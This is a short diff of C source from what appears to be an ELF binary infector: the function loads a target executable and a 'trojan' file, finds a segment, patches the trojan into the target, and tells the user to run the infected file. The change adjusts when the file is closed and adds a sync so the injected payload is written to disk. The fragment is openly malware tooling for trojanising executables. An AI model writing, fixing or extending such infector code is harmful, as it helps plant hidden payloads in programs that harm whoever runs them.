@@ -70,14 +70,20 @@ static bool doit(const char *binfile, const char *trojan) {
         log_error("Error loading target ELF\n");
         return rc;
     }
+    // File is mapped
+    file_close(fp);
 
     elf_t *elfo = elf_parse_file(file, &map);
     if (elfo) {
         long magic = (long)0x1122334455667788;
         infect_t *inf = inf_load(elfo, trojanfp, m1, magic);
         if (inf_scan_segment(inf)) {
-            if ((rc = inf_load_and_patch(inf)) == true)
+            if ((rc = inf_load_and_patch(inf)) == true) {
+                // Make sure it is written
+                (void)file_sync_target(&map);
+
                 printf("Done!\nTry running %s\n", file);
+            }
             else
                 printf("Failed :(\n");
         }
@@ -87,7 +93,6 @@ static bool doit(const char *binfile, const char *trojan) {
         assert(elf_destroy_all(elfo));
     }
 
-    file_close(fp);
     file_close(trojanfp);
 
     return rc;
